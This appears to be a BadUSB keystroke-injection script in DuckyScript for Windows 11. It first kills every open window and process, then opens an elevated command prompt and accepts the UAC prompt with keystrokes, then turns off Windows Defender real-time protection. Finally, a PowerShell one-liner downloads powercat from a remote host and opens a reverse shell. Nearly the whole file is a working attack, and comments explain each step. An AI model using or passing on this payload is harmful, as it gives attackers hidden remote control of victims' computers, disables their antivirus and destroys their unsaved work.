REM Short script for reverse shell on Windows 11 Machine
REM Machine needs to be unlocked 
REM User needs administrator privs
REM Stealthier method
REM Hides process 

REM Payload Start 
DELAY 3000
REM Short 3 second delay for bad-usb to setup
GUI r
REM Shortcut to open windows run search bar
DELAY 300
STRING cmd 
REM Open CMD
DELAY 400
ENTER
STRING powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
REM Kill all open processes on the machine. Note: Doesnt kill cmd window
ENTER
STRING exit 
ENTER
GUI r
STRING powershell Start-Process cmd -Verb runAs
REM Run CMD as Administrator
DELAY 100
ENTER
DELAY 1000
ALT TAB
REM Select UAC window once it pops up
DELAY 500
ALT y
REM Bypass UAC window
DELAY 400
STRING powershell -c Set-MpPreference -DisableRealtimeMonitoring $true
REM Disable Windows Defender
ENTER
DELAY 300
STRING 
DELAY 300
Enter
STRING Powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/powercat.ps1');powercat -c 192.168.1.5 -p 4444 -e cmd"
REM Powershell one-liner to download and execute Powercat for reverse shell 
ENTER
